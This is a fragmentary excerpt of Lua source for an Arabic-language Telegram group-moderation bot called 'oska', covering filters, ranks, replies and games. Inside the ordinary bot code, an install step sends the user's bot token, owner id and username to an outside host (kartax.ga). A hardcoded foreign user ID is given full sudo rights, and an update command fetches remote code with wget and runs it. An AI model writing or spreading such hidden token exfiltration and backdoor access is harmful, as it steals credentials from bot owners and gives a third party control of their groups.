...
https.request('http://kartax.ga/oska/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./oska.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("run", "w")  
...
sudo_users = {SUDO,500279363,500279363}   
...
if tonumber(user_id) == tonumber(500279363) then  
var = true  
elseif tonumber(user_id) == tonumber(500279363) then
var = true  
...
oska_Msg = 'قمة التفاعل ' 
elseif msgs < 5500 then 
oska_Msg = 'اسد التفاعل ' 
elseif msgs < 7000 then 
oska_Msg = 'ملك التفاعل' 
...
function plugin_oskaa(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.oskaa and msg then
pre_msg = plugin.oskaa(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function Sourceoska(msg,data) -- بداية العمل
if msg then
...
Sourceoskar = '※︙مرحبا بك عزيزي 👋🏼،\n※︙انا بوت حمايه المجموعات  ؟\n※︙يمكنك اضافتي الى مجموعتك •\n※︙آضفني وارفعني مشرف ارسل < تفعيل >\n[ᴄʜ › ᴇᴠᴇᴏᴇ ᴛᴇᴀᴍ ⁦˖](T.ME/KKlI9)'
end 
send(msg.chat_id_, msg.id_, Sourceoskar) 
end
end
...
send(msg.chat_id_, msg.id_,oska_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf oska.lua')
os.execute('wget https://raw.githubusercontent.com/oskateam/oska/master/oska.lua')
send(msg.chat_id_, msg.id_,' ※︙ تم تحديث السورس \n ※︙ لديك اخر اصدار لسورساوسكا\n ※︙ الاصدار » { 1.3v}')
dofile('oska.lua')  
end
if text == 'الاصدار ※' and SudoBot(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ※︙ اصدار سورس اوسكا\n ※︙ الاصدار »{ 1.3v}')
end
...
send(msg.chat_id_, msg.id_,'※︙  عدد الكروبات الان » { '..#group..' }'..oskak..''..oska..'\n※︙  الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
usertext = '\n ※︙ العضو » ['..result.title_..'](t.me/'..(username or 'oska')..')'
status  = '\n ※︙ تم ترقيته مطور'
...
local oska1_Msg = database:get(bot_id.."oska1:Add:Filter:Rp2"..text..msg.chat_id_)   
if oska1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ※︙ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'oska')..') \n ※︙ '..oska1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if oska_Msg and not Special(msg) then  
local oska_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if oska_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ※︙ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ※︙ ["..oska_Msg.."] \n")
else
send(msg.chat_id_,0," ※︙ العضو : {["..data.first_name_.."](T.ME/KKlI9)}\n ※︙ ["..oska_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ※︙ عذرا » {["..data.first_name_.."](T.ME/KKlI9)}\n ※︙ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
※︙ᴇᴠᴇᴏᴇ ᴛᴇᴀᴍ ⁦˖
------------- ᴇᴠ -------------
※︙[ᴄʜᴀɴɴᴇʟ ᴇᴠᴇᴏᴇ](T.ME/KKlI9)
※︙[ɪɴғᴏʀᴍᴀᴛɪᴏɴ](t.me/Aa_ew)
※︙[ᴅᴇᴠʟᴘᴏᴇʀ](t.me/Aa_ew)
※︙[ɢʀᴏᴜᴘ ᴇᴠᴇᴏᴇ](https://T.ME/KKlI9)
------------- ᴇᴠ -------------
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ※︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'oska')..') \n ※︙تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ※︙بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'oska')..') \n ※︙تـم قفـل التاك بالكتم ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ※︙ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'oska')..')'
status  = '\n ※︙ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ※︙ العضو » '..userid..''
...
database:set(bot_id.."oska1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."oska1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ※︙ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."oska1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."oska1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."oska1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."oska1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ※︙ تم منع الكلمه مع التحذير")  
database:del(bot_id.."oska1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."oska1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."oska1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."oska1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ※︙ ارسل الكلمه الان")  
database:set(bot_id.."oska1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."oska1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."oska1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."oska1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."oska1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."oska1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."oska1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."oska1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."oska1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ※︙ قائمة المنع \n-----------------------------------\n"
for k,v in pairs(list) do  
local oska_Msg = database:get(bot_id.."oska1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..oska_Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ※︙ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'oska')..')'..'\n ※︙ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'اوسكا').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'اوسكا')
local oska_Msg = {
'عمغي 🥺💕.',
'هاا شتريد كافي ☹️.',
'مشايف بوت شني 😂.',
...
send(msg.chat_id_, msg.id_,'['..oska_Msg[math.random(#oska_Msg)]..']') 
return false
end
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'اوسكا').." غادر" or text == 'غادر' then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'oska')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
oskadx(msg.chat_id_, msg.id_, ' ※︙ ايدي المجموعة » ( '..msg.chat_id_..' )\n ※︙ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ※︙ عدد المحظورين » ( *'..data.kicked_count_..' )*\n ※︙ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
----------------------------------------------------------------------------
if text == 'اوامر التحشيش'  or text == 'م10' then
if not Mod(msg) then
...
KlamSpeed = {'سحور','سياره','استقبال','قنفه','اوسكان','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
...
name = string.gsub(name,'اوسكان','و ن ف ا')
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'اوسكا')
...
oska = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(oska)
...
--------------------------------------------------------------------------------------------------------------
Sourceoska(data.message_,data)
plugin_oskaa(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
...
------------------------------------------------------------------------
local oskaAbot = database:get(bot_id.."oska1:Add:Filter:Rp2"..text..result.chat_id_)   
if oskaAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"※︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n※︙["..oskaAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local oska1_Msg = database:get(bot_id.."oska1:Add:Filter:Rp2"..text..result.chat_id_)   
if oska1_Msg then    
send(msg.chat_id_, msg.id_,"※︙"..oska1_Msg)
